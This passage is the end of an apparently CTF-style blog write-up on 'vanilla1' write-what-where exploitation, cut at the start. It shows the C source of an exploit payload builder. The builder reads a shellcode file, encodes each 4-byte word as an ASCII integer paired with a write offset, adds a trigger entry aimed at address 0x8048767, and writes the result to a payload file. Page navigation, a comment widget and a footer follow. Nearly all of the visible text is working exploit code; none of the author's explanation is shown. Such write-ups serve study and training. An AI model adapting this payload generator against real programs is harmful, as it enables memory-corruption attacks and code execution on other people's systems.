    <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span> <span class="p">(</span><span class="s">"Usage: %s [input] [output]</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
        <span class="n">exit</span> <span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">fp_in</span> <span class="o">=</span> <span class="n">fopen</span> <span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s">"r"</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">fp_in</span><span class="p">)</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>

    <span class="n">fp_out</span> <span class="o">=</span> <span class="n">fopen</span> <span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="s">"w"</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">fp_out</span><span class="p">)</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>

    <span class="n">n_elts</span> <span class="o">=</span> <span class="n">get_nelts</span> <span class="p">(</span><span class="n">fp_in</span><span class="p">);</span>

    <span class="c1">// alloc array</span>
    <span class="n">array</span> <span class="o">=</span> <span class="n">calloc</span> <span class="p">(</span><span class="n">n_elts</span> <span class="o">+</span> <span class="mi">200</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="o">*</span><span class="n">array</span><span class="p">));</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">array</span><span class="p">)</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>

    <span class="c1">// fill array with shellcode</span>
    <span class="n">fill_array</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">array</span><span class="p">,</span> <span class="n">n_elts</span><span class="p">,</span> <span class="n">fp_in</span><span class="p">);</span>
    <span class="c1">// set trigger</span>
    <span class="n">array</span><span class="p">[</span><span class="n">n_elts</span><span class="p">].</span><span class="n">value</span> <span class="o">=</span> <span class="n">i2a</span> <span class="p">(</span><span class="mh">0x8048767</span><span class="p">);</span>
    <span class="n">array</span><span class="p">[</span><span class="n">n_elts</span><span class="p">].</span><span class="n">offset</span> <span class="o">=</span> <span class="n">i2a</span> <span class="p">(</span><span class="o">-</span><span class="mi">15</span><span class="p">);</span>

    <span class="c1">// show debug</span>
    <span class="k">for</span> <span class="p">(</span><span class="n">idx_array</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">idx_array</span> <span class="o">&lt;</span> <span class="n">n_elts</span> <span class="o">+</span> <span class="mi">2</span><span class="p">;</span> <span class="n">idx_array</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">array</span><span class="p">[</span><span class="n">idx_array</span><span class="p">].</span><span class="n">value</span> <span class="o">&amp;&amp;</span> <span class="n">array</span><span class="p">[</span><span class="n">idx_array</span><span class="p">].</span><span class="n">value</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">dump</span> <span class="p">(</span><span class="n">array</span><span class="p">[</span><span class="n">idx_array</span><span class="p">].</span><span class="n">value</span><span class="p">,</span> <span class="n">strlen</span> <span class="p">(</span><span class="n">array</span><span class="p">[</span><span class="n">idx_array</span><span class="p">].</span><span class="n">value</span><span class="p">),</span> <span class="n">strlen</span> <span class="p">(</span><span class="n">array</span><span class="p">[</span><span class="n">idx_array</span><span class="p">].</span><span class="n">value</span><span class="p">));</span>
            <span class="n">dump</span> <span class="p">(</span><span class="n">array</span><span class="p">[</span><span class="n">idx_array</span><span class="p">].</span><span class="n">offset</span><span class="p">,</span> <span class="n">strlen</span> <span class="p">(</span><span class="n">array</span><span class="p">[</span><span class="n">idx_array</span><span class="p">].</span><span class="n">offset</span><span class="p">),</span> <span class="n">strlen</span><span class="p">(</span><span class="n">array</span><span class="p">[</span><span class="n">idx_array</span><span class="p">].</span><span class="n">offset</span><span class="p">));</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="c1">// create payload file</span>
    <span class="k">for</span> <span class="p">(</span><span class="n">idx_array</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">idx_array</span> <span class="o">&lt;</span> <span class="n">n_elts</span> <span class="o">+</span> <span class="mi">2</span><span class="p">;</span> <span class="n">idx_array</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">array</span><span class="p">[</span><span class="n">idx_array</span><span class="p">].</span><span class="n">value</span> <span class="o">&amp;&amp;</span> <span class="n">array</span><span class="p">[</span><span class="n">idx_array</span><span class="p">].</span><span class="n">value</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">fwrite</span> <span class="p">(</span><span class="n">array</span><span class="p">[</span><span class="n">idx_array</span><span class="p">].</span><span class="n">value</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">array</span><span class="p">[</span><span class="n">idx_array</span><span class="p">].</span><span class="n">value</span><span class="p">),</span> <span class="n">fp_out</span><span class="p">);</span>
            <span class="n">fwrite</span> <span class="p">(</span><span class="n">array</span><span class="p">[</span><span class="n">idx_array</span><span class="p">].</span><span class="n">offset</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">array</span><span class="p">[</span><span class="n">idx_array</span><span class="p">].</span><span class="n">offset</span><span class="p">),</span> <span class="n">fp_out</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="n">fclose</span> <span class="p">(</span><span class="n">fp_in</span><span class="p">);</span>
    <span class="n">fclose</span> <span class="p">(</span><span class="n">fp_out</span><span class="p">);</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">get_fsize</span> <span class="p">(</span><span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">int</span> <span class="n">sz_file</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">old_offset</span><span class="p">;</span>

    <span class="n">old_offset</span> <span class="o">=</span> <span class="n">ftell</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
    <span class="n">fseek</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">SEEK_END</span><span class="p">);</span>
    <span class="n">sz_file</span> <span class="o">=</span> <span class="n">ftell</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
    <span class="n">fseek</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">old_offset</span><span class="p">,</span> <span class="n">SEEK_SET</span><span class="p">);</span>

    <span class="k">return</span> <span class="n">sz_file</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">get_nelts</span> <span class="p">(</span><span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">int</span> <span class="n">sz_file</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">n_elts</span><span class="p">,</span> <span class="n">rest</span><span class="p">;</span>

    <span class="c1">// compute array n_elts</span>
    <span class="n">sz_file</span> <span class="o">=</span> <span class="n">get_fsize</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
    <span class="n">rest</span> <span class="o">=</span> <span class="n">sz_file</span> <span class="o">%</span> <span class="mi">4</span><span class="p">;</span>
    <span class="n">n_elts</span> <span class="o">=</span> <span class="p">(</span><span class="n">sz_file</span> <span class="o">-</span> <span class="n">rest</span><span class="p">)</span> <span class="o">/</span> <span class="mi">4</span> <span class="o">+</span> <span class="p">(</span><span class="n">rest</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">?</span> <span class="mi">1</span> <span class="o">:</span> <span class="mi">0</span><span class="p">);</span>

    <span class="n">printf</span> <span class="p">(</span><span class="s">"sz_file = %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">sz_file</span><span class="p">);</span>
    <span class="n">printf</span> <span class="p">(</span><span class="s">"rest    = %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">rest</span><span class="p">);</span>
    <span class="n">printf</span> <span class="p">(</span><span class="s">"n_elts  = %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">n_elts</span><span class="p">);</span>

    <span class="k">return</span> <span class="n">n_elts</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// integer to ascii</span>
<span class="kt">char</span> <span class="o">*</span><span class="nf">i2a</span> <span class="p">(</span><span class="kt">uint32_t</span> <span class="n">value</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">intstr</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">len_intstr</span><span class="p">;</span>

    <span class="n">intstr</span> <span class="o">=</span> <span class="n">calloc</span> <span class="p">(</span><span class="mi">21</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="o">*</span><span class="n">intstr</span><span class="p">));</span>
    <span class="n">memset</span> <span class="p">(</span><span class="n">intstr</span><span class="p">,</span> <span class="sc">'a'</span><span class="p">,</span> <span class="mi">19</span><span class="p">);</span>
    <span class="n">snprintf</span> <span class="p">(</span><span class="n">intstr</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="s">"%d"</span><span class="p">,</span> <span class="n">value</span><span class="p">);</span>
    <span class="n">len_intstr</span> <span class="o">=</span> <span class="n">strlen</span> <span class="p">(</span><span class="n">intstr</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">intstr</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
        <span class="n">intstr</span><span class="p">[</span><span class="n">len_intstr</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'a'</span><span class="p">;</span>

    <span class="k">return</span> <span class="n">intstr</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">struct</span> <span class="n">dpatch_t</span> <span class="o">*</span><span class="nf">fill_array</span> <span class="p">(</span><span class="kt">int</span> <span class="n">off_buffer</span><span class="p">,</span> <span class="k">struct</span> <span class="n">dpatch_t</span> <span class="o">*</span><span class="n">array</span><span class="p">,</span> <span class="kt">int</span> <span class="n">n_elts</span><span class="p">,</span> <span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">)</span>
<span class="p">{</span>
    <span class="c1">// buffer</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">buffer</span><span class="p">;</span>
    <span class="c1">// loop</span>
    <span class="kt">int</span> <span class="n">idx_array</span><span class="p">,</span> <span class="n">idx_buffer</span><span class="p">;</span> 
    <span class="kt">int</span> <span class="n">sz_file</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">rest</span><span class="p">;</span>

    <span class="n">sz_file</span> <span class="o">=</span> <span class="n">get_fsize</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
    <span class="n">rest</span> <span class="o">=</span> <span class="n">sz_file</span> <span class="o">%</span> <span class="mi">4</span><span class="p">;</span>

    <span class="c1">// alloc buffer</span>
    <span class="n">buffer</span> <span class="o">=</span> <span class="n">calloc</span> <span class="p">(</span><span class="n">sz_file</span> <span class="o">+</span> <span class="p">(</span><span class="n">rest</span> <span class="o">!=</span> <span class="mi">0</span> <span class="o">?</span> <span class="mi">4</span> <span class="o">:</span> <span class="mi">0</span><span class="p">),</span> <span class="k">sizeof</span><span class="p">(</span><span class="o">*</span><span class="n">buffer</span><span class="p">));</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">buffer</span><span class="p">)</span>
        <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>

    <span class="c1">// read</span>
    <span class="n">fseek</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">SEEK_SET</span><span class="p">);</span>
    <span class="n">fread</span> <span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">sz_file</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">fp</span><span class="p">);</span>

    <span class="c1">// fix off_buffer</span>
    <span class="n">off_buffer</span> <span class="o">=</span> <span class="n">off_buffer</span> <span class="o">/</span> <span class="mi">4</span><span class="p">;</span>

    <span class="c1">// construct array</span>
    <span class="k">for</span> <span class="p">(</span><span class="n">idx_array</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">idx_buffer</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">idx_array</span> <span class="o">&lt;</span> <span class="n">n_elts</span><span class="p">;</span> <span class="n">idx_array</span><span class="o">++</span><span class="p">,</span> <span class="n">idx_buffer</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">dump</span> <span class="p">(((</span><span class="kt">uint32_t</span> <span class="o">*</span><span class="p">)</span> <span class="n">buffer</span> <span class="o">+</span> <span class="n">idx_buffer</span><span class="p">),</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">16</span><span class="p">);</span>
        <span class="n">array</span><span class="p">[</span><span class="n">idx_array</span><span class="p">].</span><span class="n">value</span> <span class="o">=</span> <span class="n">i2a</span> <span class="p">(</span><span class="o">*</span><span class="p">((</span><span class="kt">uint32_t</span> <span class="o">*</span><span class="p">)</span> <span class="n">buffer</span> <span class="o">+</span> <span class="n">idx_buffer</span><span class="p">));</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">idx_buffer</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">off_buffer</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
            <span class="n">array</span><span class="p">[</span><span class="n">idx_array</span><span class="p">].</span><span class="n">offset</span> <span class="o">=</span> <span class="n">i2a</span> <span class="p">(</span><span class="mh">0x40000000</span><span class="p">);</span>
        <span class="k">else</span>
            <span class="n">array</span><span class="p">[</span><span class="n">idx_array</span><span class="p">].</span><span class="n">offset</span> <span class="o">=</span> <span class="n">i2a</span> <span class="p">(</span><span class="n">idx_buffer</span> <span class="o">+</span> <span class="n">off_buffer</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">free</span> <span class="p">(</span><span class="n">buffer</span><span class="p">);</span>

    <span class="k">return</span> <span class="n">array</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// dump</span>
<span class="kt">int</span> <span class="nf">dump</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">bytes</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">nbytes</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">align</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">size_t</span> <span class="n">idx_bytes</span><span class="p">,</span> <span class="n">j</span><span class="p">,</span> <span class="n">last</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">n_disp</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">bytes</span> <span class="o">||</span> <span class="o">!</span><span class="n">nbytes</span><span class="p">)</span>
        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>

    <span class="c1">// first part of line is hex</span>
    <span class="k">for</span> <span class="p">(</span><span class="n">idx_bytes</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">last</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">idx_bytes</span> <span class="o">&lt;</span> <span class="n">nbytes</span><span class="p">;</span> <span class="n">idx_bytes</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span> <span class="p">(</span><span class="s">"%02x "</span><span class="p">,</span> <span class="n">bytes</span><span class="p">[</span><span class="n">idx_bytes</span><span class="p">]);</span>
        <span class="c1">// if we got to the alignment value or end of bytes</span>
        <span class="c1">// we print the second part of the line</span>
        <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="n">idx_bytes</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">%</span> <span class="n">align</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">idx_bytes</span> <span class="o">==</span> <span class="n">nbytes</span> <span class="o">-</span> <span class="mi">1</span> <span class="p">)</span> <span class="p">{</span>
            <span class="c1">// we print spaces if we arrived at end of bytes</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">idx_bytes</span> <span class="o">==</span> <span class="n">nbytes</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
                <span class="c1">// compute the number of spaces to show</span>
                <span class="n">n_disp</span> <span class="o">=</span> <span class="n">align</span> <span class="o">-</span> <span class="p">(</span><span class="n">nbytes</span> <span class="o">%</span> <span class="n">align</span><span class="p">);</span>
                <span class="n">n_disp</span> <span class="o">=</span> <span class="p">(</span><span class="n">nbytes</span> <span class="o">%</span> <span class="n">align</span><span class="p">)</span> <span class="o">?</span> <span class="n">n_disp</span> <span class="o">:</span> <span class="mi">0</span><span class="p">;</span>
                <span class="k">for</span> <span class="p">(</span><span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">n_disp</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span><span class="p">)</span>
                    <span class="n">printf</span><span class="p">(</span><span class="s">"   "</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="c1">// separation</span>
            <span class="n">printf</span> <span class="p">(</span><span class="s">"| "</span><span class="p">);</span>
            <span class="c1">// second part of line is corresponding character</span>
            <span class="k">for</span> <span class="p">(</span><span class="n">j</span> <span class="o">=</span> <span class="n">last</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">last</span> <span class="o">+</span> <span class="n">align</span> <span class="o">&amp;&amp;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">nbytes</span><span class="p">;</span>  <span class="n">j</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">isprint</span><span class="p">(</span><span class="n">bytes</span><span class="p">[</span><span class="n">j</span><span class="p">]))</span>
                    <span class="n">printf</span> <span class="p">(</span><span class="s">"%c"</span><span class="p">,</span> <span class="n">bytes</span><span class="p">[</span><span class="n">j</span><span class="p">]);</span>
                <span class="k">else</span>
                    <span class="n">putchar</span> <span class="p">(</span><span class="sc">'.'</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="n">putchar</span> <span class="p">(</span><span class="sc">'\n'</span><span class="p">);</span>
            <span class="n">last</span> <span class="o">=</span> <span class="n">idx_bytes</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></pre></figure>


  </div>

  <div class="post-navigation">
    
    <a class="post-prev" href="/binholic/2013/03/10/ndh2k13-prequals-meow-misc.html">Previous : [NDH2k13] Prequals - Meow (misc)</a>
    

    
    <a class="post-next" href="/binholic/2013/08/20/root-me-remote-binary-2-advanced-format-string.html">Next : [Root-Me] Remote Binary 2 - An advanced remote format string example</a>
    
  </div>

  
    <div id="disqus_thread"></div>
    <script>
        var disqus_config = function () {
            this.page.url = "http://binholic.com/binholic/2013/06/10/vanilla1-write-what-where-exploitation.html";
            this.page.identifier = "/binholic/2013/06/10/vanilla1-write-what-where-exploitation";
        };

        (function() { // DON'T EDIT BELOW THIS LINE
            var d = document, s = d.createElement('script');

            s.src = '//binholic.disqus.com/embed.js';

            s.setAttribute('data-timestamp', +new Date());
            (d.head || d.body).appendChild(s);
        })();
    </script>
    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
  

</article>

      </div>
    </div>

    <footer class="site-footer">

  <div class="wrapper">

      <div class="site-footer">
        <ul class="social-media-list">
          
          <li>
            <a href="https://github.com/m101"><span class="icon icon--github"><svg viewBox="0 0 16 16"><path fill="#828282" d="M7.999,0.431c-4.285,0-7.76,3.474-7.76,7.761 c0,3.428,2.223,6.337,5.307,7.363c0.388,0.071,0.53-0.168,0.53-0.374c0-0.184-0.007-0.672-0.01-1.32 c-2.159,0.469-2.614-1.04-2.614-1.04c-0.353-0.896-0.862-1.135-0.862-1.135c-0.705-0.481,0.053-0.472,0.053-0.472 c0.779,0.055,1.189,0.8,1.189,0.8c0.692,1.186,1.816,0.843,2.258,0.645c0.071-0.502,0.271-0.843,0.493-1.037 C4.86,11.425,3.049,10.76,3.049,7.786c0-0.847,0.302-1.54,0.799-2.082C3.768,5.507,3.501,4.718,3.924,3.65 c0,0,0.652-0.209,2.134,0.796C6.677,4.273,7.34,4.187,8,4.184c0.659,0.003,1.323,0.089,1.943,0.261 c1.482-1.004,2.132-0.796,2.132-0.796c0.423,1.068,0.157,1.857,0.077,2.054c0.497,0.542,0.798,1.235,0.798,2.082 c0,2.981-1.814,3.637-3.543,3.829c0.279,0.24,0.527,0.713,0.527,1.437c0,1.037-0.01,1.874-0.01,2.129 c0,0.208,0.14,0.449,0.534,0.373c3.081-1.028,5.302-3.935,5.302-7.362C15.76,3.906,12.285,0.431,7.999,0.431z"/></svg>
</span></a>

          </li>
          

          
          <li>
            <a href="https://twitter.com/w_levin"><span class="icon icon--twitter"><svg viewBox="0 0 16 16"><path fill="#828282" d="M15.969,3.058c-0.586,0.26-1.217,0.436-1.878,0.515c0.675-0.405,1.194-1.045,1.438-1.809c-0.632,0.375-1.332,0.647-2.076,0.793c-0.596-0.636-1.446-1.033-2.387-1.033c-1.806,0-3.27,1.464-3.27,3.27 c0,0.256,0.029,0.506,0.085,0.745C5.163,5.404,2.753,4.102,1.14,2.124C0.859,2.607,0.698,3.168,0.698,3.767 c0,1.134,0.577,2.135,1.455,2.722C1.616,6.472,1.112,6.325,0.671,6.08c0,0.014,0,0.027,0,0.041c0,1.584,1.127,2.906,2.623,3.206 C3.02,9.402,2.731,9.442,2.433,9.442c-0.211,0-0.416-0.021-0.615-0.059c0.416,1.299,1.624,2.245,3.055,2.271 c-1.119,0.877-2.529,1.4-4.061,1.4c-0.264,0-0.524-0.015-0.78-0.046c1.447,0.928,3.166,1.469,5.013,1.469 c6.015,0,9.304-4.983,9.304-9.304c0-0.142-0.003-0.283-0.009-0.423C14.976,4.29,15.531,3.714,15.969,3.058z"/></svg>
</span></a>

          </li>
          

          
          <li>
            <a href="mailto:m101.sec@gmail.com"><span class="icon icon--email"><?xml version="1.0" encoding="UTF-8"?>
<!-- Generator: Adobe Illustrator 16.0.0, SVG Export Plug-In . SVG Version: 6.00 Build 0)  -->
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="240.665px" height="250px" viewBox="43.833 205.167 240.665 250" enable-background="new 43.833 205.167 240.665 250" xml:space="preserve">
<g>
	<path fill="#323232" d="M221.459,396.62c-8.84,0-15.904-2.21-21.191-6.63c-5.289-4.42-8.449-10.441-9.488-18.07   c-4.855,5.895-10.66,10.965-17.42,15.21c-6.762,4.249-14.561,6.37-23.4,6.37c-6.59,0-12.83-1.256-18.72-3.77   c-5.895-2.512-11.095-6.15-15.6-10.92c-4.509-4.766-8.105-10.571-10.79-17.42c-2.689-6.846-4.03-14.69-4.03-23.531   c0-9.879,1.56-19.064,4.68-27.56c3.12-8.49,7.365-15.86,12.74-22.1c5.371-6.24,11.7-11.136,18.98-14.69   c7.28-3.551,15.08-5.33,23.4-5.33c9.01,0,16.68,1.82,23.01,5.461c6.324,3.639,11.311,8.234,14.949,13.779l2.34-17.42h20.541   l-10.66,85.02c-0.52,3.99-0.781,7.021-0.781,9.101c0,5.029,1.041,8.929,3.121,11.7c2.08,2.774,5.545,4.16,10.4,4.16   c4.504,0,8.84-1.646,13-4.94c4.16-3.29,7.799-7.931,10.92-13.91c3.119-5.979,5.589-13.085,7.41-21.319   c1.82-8.23,2.729-17.291,2.729-27.17c0-11.961-2.123-23.051-6.369-33.281c-4.25-10.225-10.228-19.064-17.939-26.52   c-7.715-7.451-16.859-13.26-27.43-17.42c-10.576-4.16-22.189-6.24-34.842-6.24c-16.119,0-30.464,3.165-43.029,9.49   c-12.57,6.33-23.14,14.605-31.72,24.83c-8.58,10.229-15.08,21.799-19.5,34.71c-4.42,12.915-6.63,26.045-6.63,39.39   c0,15.08,2.34,28.516,7.02,40.301c4.68,11.789,11.18,21.795,19.5,30.029c8.32,8.23,18.11,14.471,29.38,18.721   c11.265,4.244,23.485,6.369,36.661,6.369c13.17,0,24.914-1.561,35.229-4.68c10.311-3.121,20.15-6.936,29.512-11.439l7.539,19.76   c-9.016,4.85-19.891,8.924-32.631,12.219c-12.738,3.291-26.479,4.941-41.209,4.941c-16.64,0-31.98-2.516-46.02-7.541   c-14.04-5.029-26.175-12.439-36.4-22.23c-10.229-9.795-18.2-21.84-23.92-36.139c-5.72-14.301-8.58-30.811-8.58-49.53   c0-17.331,2.99-33.841,8.97-49.53c5.98-15.686,14.471-29.51,25.48-41.47c11.005-11.96,24.266-21.45,39.78-28.47   c15.51-7.02,32.889-10.53,52.129-10.53c16.291,0,31.156,2.645,44.59,7.93c13.432,5.29,24.916,12.524,34.451,21.71   c9.529,9.189,16.898,20.064,22.1,32.63c5.199,12.568,7.799,26.129,7.799,40.689c0,12.48-1.518,23.965-4.549,34.45   c-3.035,10.489-7.195,19.5-12.48,27.04c-5.289,7.54-11.615,13.391-18.98,17.55C238.139,394.54,230.124,396.62,221.459,396.62z    M156.979,374.26c6.76,0,13-1.86,18.721-5.59c5.719-3.725,10.311-7.756,13.779-12.09l6.24-51.48   c-3.469-5.545-7.975-10.051-13.52-13.52c-5.551-3.465-11.875-5.2-18.98-5.2c-5.201,0-10.23,1.17-15.08,3.511   c-4.855,2.34-9.145,5.635-12.87,9.879c-3.729,4.25-6.675,9.32-8.84,15.211c-2.169,5.895-3.25,12.395-3.25,19.5   c0,13.174,3.291,23.1,9.88,29.77C139.645,370.925,147.62,374.26,156.979,374.26z"/>
</g>
</svg></span></a>

          </li>
          

          
          <li>
            <a href="http://127.0.0.1:8888/USK@ABR8mm2t1L1G8cBG70cDy4PHFO6LPV~LrA-RIZxgOGI,pnGWUxb7k8~5-ywwqnBakTXx5ZFw6QzzZj7H~45NgE8,AQACAAE/binholic/-1/"><span class="icon icon--freenet"><?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!-- Created with Inkscape (http://www.inkscape.org/) -->
<svg
   xmlns:svg="http://www.w3.org/2000/svg"
   xmlns="http://www.w3.org/2000/svg"
   version="1.0"
   width="79.12"
   height="52.64">
  <defs/>
  <g
     transform="translate(-47.495719,-111.30691)">
    <path
       d="M 80.03,122.66 C 94.49,107.06 104.32,113.99 87.53,124.89 C 82.19,128.36 83.58,129.37 87.17,128.82 C 92.24,128.05 95.01,129.02 96.24,129.98 C 99.18,132.28 100.65,130.57 101.64,128.82 C 103.61,125.35 110.25,129.12 105.39,132.75 C 101.59,135.58 102.12,138.77 105.57,140.61 C 111.96,144.01 126.30,150.75 124.14,157.93 C 123.26,160.86 121.67,163.62 118.07,159.89 C 111.32,152.92 106.83,146.97 91.28,144.54 C 81.24,142.96 71.15,140.33 61.46,145.25 C 56.90,147.67 51.16,149.23 49.94,146.37 C 48.35,142.64 56.47,139.57 64.32,138.82 C 69.42,138.33 73.99,134.99 67.00,133.29 C 58.39,130.64 68.28,123.09 74.50,124.89 C 78.55,126.07 78.95,123.83 80.03,122.66 z"
       style="fill:#ffffff;stroke:#356ace;stroke-width:1.5;" />
  </g>
</svg>
</span></a>

          </li>
          
        </ul>
      </div>

    </div>

  </div>

</footer>

<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({
          google_ad_client: "ca-pub-9302170278788846",
          enable_page_level_ads: true
     });
</script>


<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-16686496-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-16686496-2');
</script>



  </body>

</html>
